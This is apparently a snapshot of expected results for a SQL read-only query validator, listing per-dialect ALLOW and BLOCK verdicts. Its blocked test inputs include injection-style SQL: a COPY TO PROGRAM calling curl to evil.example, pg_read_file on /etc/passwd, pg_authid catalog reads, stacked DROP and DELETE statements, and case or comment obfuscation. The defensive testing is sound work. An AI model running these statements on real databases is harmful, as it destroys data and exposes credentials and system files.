@@ -1,0 +1,1008 @@
+{
+  "allow_cte": {
+    "dialects": {
+      "bigquery": {
+        "errors": [],
+        "layer": null,
+        "limit_applied": 10000,
+        "safe_sql": "WITH t AS (\n  SELECT\n    amount\n  FROM orders\n)\nSELECT\n  *\nFROM t\nLIMIT 10000",
+        "verdict": "ALLOW"
+      },
+      "mysql": {
+        "errors": [],
+        "layer": null,
+        "limit_applied": 10000,
+        "safe_sql": "WITH t AS (\n  SELECT\n    amount\n  FROM orders\n)\nSELECT\n  *\nFROM t\nLIMIT 10000",
+        "verdict": "ALLOW"
+      },
+      "postgres": {
+        "errors": [],
+        "layer": null,
+        "limit_applied": 10000,
+        "safe_sql": "WITH t AS (\n  SELECT\n    amount\n  FROM orders\n)\nSELECT\n  *\nFROM t\nLIMIT 10000",
+        "verdict": "ALLOW"
+      },
+      "sqlite": {
+        "errors": [],
+        "layer": null,
+        "limit_applied": 10000,
+        "safe_sql": "WITH t AS (\n  SELECT\n    amount\n  FROM orders\n)\nSELECT\n  *\nFROM t\nLIMIT 10000",
+        "verdict": "ALLOW"
+      }
+    },
+    "sql": "WITH t AS (SELECT amount FROM orders) SELECT * FROM t"
+  },
+  "allow_group": {
+    "dialects": {
+      "bigquery": {
+        "errors": [],
+        "layer": null,
+        "limit_applied": 10000,
+        "safe_sql": "SELECT\n  status,\n  SUM(amount) AS total\nFROM orders\nGROUP BY\n  status\nORDER BY\n  total DESC NULLS FIRST\nLIMIT 10000",
+        "verdict": "ALLOW"
+      },
+      "mysql": {
+        "errors": [],
+        "layer": null,
+        "limit_applied": 10000,
+        "safe_sql": "SELECT\n  status,\n  SUM(amount) AS total\nFROM orders\nGROUP BY\n  status\nORDER BY\n  CASE WHEN SUM(amount) IS NULL THEN 1 ELSE 0 END DESC, SUM(amount) DESC\nLIMIT 10000",
+        "verdict": "ALLOW"
+      },
+      "postgres": {
+        "errors": [],
+        "layer": null,
+        "limit_applied": 10000,
+        "safe_sql": "SELECT\n  status,\n  SUM(amount) AS total\nFROM orders\nGROUP BY\n  status\nORDER BY\n  total DESC\nLIMIT 10000",
+        "verdict": "ALLOW"
+      },
+      "sqlite": {
+        "errors": [],
+        "layer": null,
+        "limit_applied": 10000,
+        "safe_sql": "SELECT\n  status,\n  SUM(amount) AS total\nFROM orders\nGROUP BY\n  status\nORDER BY\n  total DESC NULLS FIRST\nLIMIT 10000",
+        "verdict": "ALLOW"
+      }
+    },
+    "sql": "SELECT status, SUM(amount) AS total FROM orders GROUP BY status ORDER BY total DESC"
+  },
+  "allow_join": {
+    "dialects": {
+      "bigquery": {
+        "errors": [],
+        "layer": null,
+        "limit_applied": 10000,
+        "safe_sql": "SELECT\n  c.name,\n  SUM(o.amount) AS total\nFROM orders AS o\nJOIN customers AS c\n  ON o.customer_id = c.id\nGROUP BY\n  c.name\nLIMIT 10000",
+        "verdict": "ALLOW"
+      },
+      "mysql": {
+        "errors": [],
+        "layer": null,
+        "limit_applied": 10000,
+        "safe_sql": "SELECT\n  c.name,\n  SUM(o.amount) AS total\nFROM orders AS o\nJOIN customers AS c\n  ON o.customer_id = c.id\nGROUP BY\n  c.name\nLIMIT 10000",
+        "verdict": "ALLOW"
+      },
+      "postgres": {
+        "errors": [],
+        "layer": null,
+        "limit_applied": 10000,
+        "safe_sql": "SELECT\n  c.name,\n  SUM(o.amount) AS total\nFROM orders AS o\nJOIN customers AS c\n  ON o.customer_id = c.id\nGROUP BY\n  c.name\nLIMIT 10000",
+        "verdict": "ALLOW"
+      },
+      "sqlite": {
+        "errors": [],
+        "layer": null,
+        "limit_applied": 10000,
+        "safe_sql": "SELECT\n  c.name,\n  SUM(o.amount) AS total\nFROM orders AS o\nJOIN customers AS c\n  ON o.customer_id = c.id\nGROUP BY\n  c.name\nLIMIT 10000",
+        "verdict": "ALLOW"
+      }
+    },
+    "sql": "SELECT c.name, SUM(o.amount) AS total FROM orders o JOIN customers c ON o.customer_id = c.id GROUP BY c.name"
+  },
+  "allow_limit_clamp": {
+    "dialects": {
+      "bigquery": {
+        "errors": [],
+        "layer": null,
+        "limit_applied": 10000,
+        "safe_sql": "SELECT\n  amount\nFROM orders\nLIMIT 10000",
+        "verdict": "ALLOW"
+      },
+      "mysql": {
+        "errors": [],
+        "layer": null,
+        "limit_applied": 10000,
+        "safe_sql": "SELECT\n  amount\nFROM orders\nLIMIT 10000",
+        "verdict": "ALLOW"
+      },
+      "postgres": {
+        "errors": [],
+        "layer": null,
+        "limit_applied": 10000,
+        "safe_sql": "SELECT\n  amount\nFROM orders\nLIMIT 10000",
+        "verdict": "ALLOW"
+      },
+      "sqlite": {
+        "errors": [],
+        "layer": null,
+        "limit_applied": 10000,
+        "safe_sql": "SELECT\n  amount\nFROM orders\nLIMIT 10000",
+        "verdict": "ALLOW"
+      }
+    },
+    "sql": "SELECT amount FROM orders LIMIT 999999"
+  },
+  "allow_limit_present": {
+    "dialects": {
+      "bigquery": {
+        "errors": [],
+        "layer": null,
+        "limit_applied": 5,
+        "safe_sql": "SELECT\n  amount\nFROM orders\nLIMIT 5",
+        "verdict": "ALLOW"
+      },
+      "mysql": {
+        "errors": [],
+        "layer": null,
+        "limit_applied": 5,
+        "safe_sql": "SELECT\n  amount\nFROM orders\nLIMIT 5",
+        "verdict": "ALLOW"
+      },
+      "postgres": {
+        "errors": [],
+        "layer": null,
+        "limit_applied": 5,
+        "safe_sql": "SELECT\n  amount\nFROM orders\nLIMIT 5",
+        "verdict": "ALLOW"
+      },
+      "sqlite": {
+        "errors": [],
+        "layer": null,
+        "limit_applied": 5,
+        "safe_sql": "SELECT\n  amount\nFROM orders\nLIMIT 5",
+        "verdict": "ALLOW"
+      }
+    },
+    "sql": "SELECT amount FROM orders LIMIT 5"
+  },
+  "allow_quoted": {
+    "dialects": {
+      "bigquery": {
+        "errors": [],
+        "layer": null,
+        "limit_applied": 10000,
+        "safe_sql": "SELECT\n  `amount`\nFROM `orders`\nLIMIT 10000",
+        "verdict": "ALLOW"
+      },
+      "mysql": {
+        "errors": [],
+        "layer": null,
+        "limit_applied": 10000,
+        "safe_sql": "SELECT\n  `amount`\nFROM `orders`\nLIMIT 10000",
+        "verdict": "ALLOW"
+      },
+      "postgres": {
+        "errors": [],
+        "layer": null,
+        "limit_applied": 10000,
+        "safe_sql": "SELECT\n  \"amount\"\nFROM \"orders\"\nLIMIT 10000",
+        "verdict": "ALLOW"
+      },
+      "sqlite": {
+        "errors": [],
+        "layer": null,
+        "limit_applied": 10000,
+        "safe_sql": "SELECT\n  \"amount\"\nFROM \"orders\"\nLIMIT 10000",
+        "verdict": "ALLOW"
+      }
+    },
+    "sql": "SELECT \"amount\" FROM \"orders\""
+  },
+  "allow_scalar": {
+    "dialects": {
+      "bigquery": {
+        "errors": [],
+        "layer": null,
+        "limit_applied": 10000,
+        "safe_sql": "SELECT\n  amount\nFROM orders\nLIMIT 10000",
+        "verdict": "ALLOW"
+      },
+      "mysql": {
+        "errors": [],
+        "layer": null,
+        "limit_applied": 10000,
+        "safe_sql": "SELECT\n  amount\nFROM orders\nLIMIT 10000",
+        "verdict": "ALLOW"
+      },
+      "postgres": {
+        "errors": [],
+        "layer": null,
+        "limit_applied": 10000,
+        "safe_sql": "SELECT\n  amount\nFROM orders\nLIMIT 10000",
+        "verdict": "ALLOW"
+      },
+      "sqlite": {
+        "errors": [],
+        "layer": null,
+        "limit_applied": 10000,
+        "safe_sql": "SELECT\n  amount\nFROM orders\nLIMIT 10000",
+        "verdict": "ALLOW"
+      }
+    },
+    "sql": "SELECT amount FROM orders"
+  },
+  "allow_union": {
+    "dialects": {
+      "bigquery": {
+        "errors": [],
+        "layer": null,
+        "limit_applied": 10000,
+        "safe_sql": "SELECT\n  amount\nFROM orders\nUNION DISTINCT\nSELECT\n  amount\nFROM orders\nLIMIT 10000",
+        "verdict": "ALLOW"
+      },
+      "mysql": {
+        "errors": [],
+        "layer": null,
+        "limit_applied": 10000,
+        "safe_sql": "SELECT\n  amount\nFROM orders\nUNION\nSELECT\n  amount\nFROM orders\nLIMIT 10000",
+        "verdict": "ALLOW"
+      },
+      "postgres": {
+        "errors": [],
+        "layer": null,
+        "limit_applied": 10000,
+        "safe_sql": "SELECT\n  amount\nFROM orders\nUNION\nSELECT\n  amount\nFROM orders\nLIMIT 10000",
+        "verdict": "ALLOW"
+      },
+      "sqlite": {
+        "errors": [],
+        "layer": null,
+        "limit_applied": 10000,
+        "safe_sql": "SELECT\n  amount\nFROM orders\nUNION\nSELECT\n  amount\nFROM orders\nLIMIT 10000",
+        "verdict": "ALLOW"
+      }
+    },
+    "sql": "SELECT amount FROM orders UNION SELECT amount FROM orders"
+  },
+  "block_case_obfuscation": {
+    "dialects": {
+      "bigquery": {
+        "errors": [
+          "only SELECT / WITH...SELECT queries are allowed, got Drop"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "mysql": {
+        "errors": [
+          "only SELECT / WITH...SELECT queries are allowed, got Drop"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "postgres": {
+        "errors": [
+          "only SELECT / WITH...SELECT queries are allowed, got Drop"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "sqlite": {
+        "errors": [
+          "only SELECT / WITH...SELECT queries are allowed, got Drop"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      }
+    },
+    "sql": "dRoP tAbLe orders"
+  },
+  "block_comment_smuggle": {
+    "dialects": {
+      "bigquery": {
+        "errors": [
+          "multiple statements are not allowed (found 2)"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "mysql": {
+        "errors": [
+          "multiple statements are not allowed (found 2)"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "postgres": {
+        "errors": [
+          "multiple statements are not allowed (found 2)"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "sqlite": {
+        "errors": [
+          "multiple statements are not allowed (found 2)"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      }
+    },
+    "sql": "SELECT 1 /* ok */; DELETE FROM orders"
+  },
+  "block_copy": {
+    "dialects": {
+      "bigquery": {
+        "errors": [
+          "only SELECT / WITH...SELECT queries are allowed, got Copy"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "mysql": {
+        "errors": [
+          "only SELECT / WITH...SELECT queries are allowed, got Copy"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "postgres": {
+        "errors": [
+          "only SELECT / WITH...SELECT queries are allowed, got Copy"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "sqlite": {
+        "errors": [
+          "only SELECT / WITH...SELECT queries are allowed, got Copy"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      }
+    },
+    "sql": "COPY orders TO PROGRAM 'curl evil.example'"
+  },
+  "block_create": {
+    "dialects": {
+      "bigquery": {
+        "errors": [
+          "only SELECT / WITH...SELECT queries are allowed, got Create"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "mysql": {
+        "errors": [
+          "only SELECT / WITH...SELECT queries are allowed, got Create"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "postgres": {
+        "errors": [
+          "only SELECT / WITH...SELECT queries are allowed, got Create"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "sqlite": {
+        "errors": [
+          "only SELECT / WITH...SELECT queries are allowed, got Create"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      }
+    },
+    "sql": "CREATE TABLE x AS SELECT * FROM orders"
+  },
+  "block_delete": {
+    "dialects": {
+      "bigquery": {
+        "errors": [
+          "only SELECT / WITH...SELECT queries are allowed, got Delete"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "mysql": {
+        "errors": [
+          "only SELECT / WITH...SELECT queries are allowed, got Delete"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "postgres": {
+        "errors": [
+          "only SELECT / WITH...SELECT queries are allowed, got Delete"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "sqlite": {
+        "errors": [
+          "only SELECT / WITH...SELECT queries are allowed, got Delete"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      }
+    },
+    "sql": "DELETE FROM orders"
+  },
+  "block_drop": {
+    "dialects": {
+      "bigquery": {
+        "errors": [
+          "only SELECT / WITH...SELECT queries are allowed, got Drop"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "mysql": {
+        "errors": [
+          "only SELECT / WITH...SELECT queries are allowed, got Drop"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "postgres": {
+        "errors": [
+          "only SELECT / WITH...SELECT queries are allowed, got Drop"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "sqlite": {
+        "errors": [
+          "only SELECT / WITH...SELECT queries are allowed, got Drop"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      }
+    },
+    "sql": "DROP TABLE orders"
+  },
+  "block_grant": {
+    "dialects": {
+      "bigquery": {
+        "errors": [
+          "only SELECT / WITH...SELECT queries are allowed, got Grant"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "mysql": {
+        "errors": [
+          "only SELECT / WITH...SELECT queries are allowed, got Grant"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "postgres": {
+        "errors": [
+          "only SELECT / WITH...SELECT queries are allowed, got Grant"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "sqlite": {
+        "errors": [
+          "only SELECT / WITH...SELECT queries are allowed, got Grant"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      }
+    },
+    "sql": "GRANT ALL ON orders TO attacker"
+  },
+  "block_info_schema": {
+    "dialects": {
+      "bigquery": {
+        "errors": [
+          "access to schema 'information_schema' is denied"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "mysql": {
+        "errors": [
+          "access to schema 'information_schema' is denied"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "postgres": {
+        "errors": [
+          "access to schema 'information_schema' is denied"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "sqlite": {
+        "errors": [
+          "access to schema 'information_schema' is denied"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      }
+    },
+    "sql": "SELECT table_name FROM information_schema.tables"
+  },
+  "block_multi": {
+    "dialects": {
+      "bigquery": {
+        "errors": [
+          "multiple statements are not allowed (found 2)"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "mysql": {
+        "errors": [
+          "multiple statements are not allowed (found 2)"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "postgres": {
+        "errors": [
+          "multiple statements are not allowed (found 2)"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "sqlite": {
+        "errors": [
+          "multiple statements are not allowed (found 2)"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      }
+    },
+    "sql": "SELECT 1; DROP TABLE orders"
+  },
+  "block_pg_sleep": {
+    "dialects": {
+      "bigquery": {
+        "errors": [
+          "dangerous function 'pg_sleep' is denied"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "mysql": {
+        "errors": [
+          "dangerous function 'pg_sleep' is denied"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "postgres": {
+        "errors": [
+          "dangerous function 'pg_sleep' is denied"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "sqlite": {
+        "errors": [
+          "dangerous function 'pg_sleep' is denied"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      }
+    },
+    "sql": "SELECT pg_sleep(5)"
+  },
+  "block_read_file": {
+    "dialects": {
+      "bigquery": {
+        "errors": [
+          "dangerous function 'pg_read_file' is denied"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "mysql": {
+        "errors": [
+          "dangerous function 'pg_read_file' is denied"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "postgres": {
+        "errors": [
+          "dangerous function 'pg_read_file' is denied"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "sqlite": {
+        "errors": [
+          "dangerous function 'pg_read_file' is denied"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      }
+    },
+    "sql": "SELECT pg_read_file('/etc/passwd')"
+  },
+  "block_select_into": {
+    "dialects": {
+      "bigquery": {
+        "errors": [
+          "forbidden Into node is not permitted in a read query"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "mysql": {
+        "errors": [
+          "forbidden Into node is not permitted in a read query"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "postgres": {
+        "errors": [
+          "forbidden Into node is not permitted in a read query"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "sqlite": {
+        "errors": [
+          "forbidden Into node is not permitted in a read query"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      }
+    },
+    "sql": "SELECT * INTO backup FROM orders"
+  },
+  "block_syscatalog": {
+    "dialects": {
+      "bigquery": {
+        "errors": [
+          "access to schema 'pg_catalog' is denied",
+          "access to system catalog 'pg_authid' is denied"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "mysql": {
+        "errors": [
+          "access to schema 'pg_catalog' is denied",
+          "access to system catalog 'pg_authid' is denied"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "postgres": {
+        "errors": [
+          "access to schema 'pg_catalog' is denied",
+          "access to system catalog 'pg_authid' is denied"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "sqlite": {
+        "errors": [
+          "access to schema 'pg_catalog' is denied",
+          "access to system catalog 'pg_authid' is denied"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      }
+    },
+    "sql": "SELECT * FROM pg_catalog.pg_authid"
+  },
+  "block_truncate": {
+    "dialects": {
+      "bigquery": {
+        "errors": [
+          "only SELECT / WITH...SELECT queries are allowed, got TruncateTable"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "mysql": {
+        "errors": [
+          "only SELECT / WITH...SELECT queries are allowed, got TruncateTable"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "postgres": {
+        "errors": [
+          "only SELECT / WITH...SELECT queries are allowed, got TruncateTable"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "sqlite": {
+        "errors": [
+          "only SELECT / WITH...SELECT queries are allowed, got TruncateTable"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      }
+    },
+    "sql": "TRUNCATE orders"
+  },
+  "block_unknown_column": {
+    "dialects": {
+      "bigquery": {
+        "errors": [
+          "column 'customer_password' does not exist on any referenced table"
+        ],
+        "layer": "allow-list policy",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "mysql": {
+        "errors": [
+          "column 'customer_password' does not exist on any referenced table"
+        ],
+        "layer": "allow-list policy",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "postgres": {
+        "errors": [
+          "column 'customer_password' does not exist on any referenced table"
+        ],
+        "layer": "allow-list policy",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "sqlite": {
+        "errors": [
+          "column 'customer_password' does not exist on any referenced table"
+        ],
+        "layer": "allow-list policy",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      }
+    },
+    "sql": "SELECT customer_password FROM orders"
+  },
+  "block_unknown_table": {
+    "dialects": {
+      "bigquery": {
+        "errors": [
+          "table 'employee_payroll' is not on the allow-list"
+        ],
+        "layer": "allow-list policy",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "mysql": {
+        "errors": [
+          "table 'employee_payroll' is not on the allow-list"
+        ],
+        "layer": "allow-list policy",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "postgres": {
+        "errors": [
+          "table 'employee_payroll' is not on the allow-list"
+        ],
+        "layer": "allow-list policy",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "sqlite": {
+        "errors": [
+          "table 'employee_payroll' is not on the allow-list"
+        ],
+        "layer": "allow-list policy",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      }
+    },
+    "sql": "SELECT * FROM employee_payroll"
+  },
+  "block_update": {
+    "dialects": {
+      "bigquery": {
+        "errors": [
+          "only SELECT / WITH...SELECT queries are allowed, got Update"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "mysql": {
+        "errors": [
+          "only SELECT / WITH...SELECT queries are allowed, got Update"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "postgres": {
+        "errors": [
+          "only SELECT / WITH...SELECT queries are allowed, got Update"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "sqlite": {
+        "errors": [
+          "only SELECT / WITH...SELECT queries are allowed, got Update"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      }
+    },
+    "sql": "UPDATE orders SET amount = 0"
+  },
+  "block_write_cte": {
+    "dialects": {
+      "bigquery": {
+        "errors": [
+          "forbidden Delete node is not permitted in a read query"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "mysql": {
+        "errors": [
+          "forbidden Delete node is not permitted in a read query"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "postgres": {
+        "errors": [
+          "forbidden Delete node is not permitted in a read query"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      },
+      "sqlite": {
+        "errors": [
+          "forbidden Delete node is not permitted in a read query"
+        ],
+        "layer": "AST validation",
+        "limit_applied": null,
+        "safe_sql": null,
+        "verdict": "BLOCK"
+      }
+    },
+    "sql": "WITH x AS (DELETE FROM orders RETURNING *) SELECT * FROM x"
+  }
+}
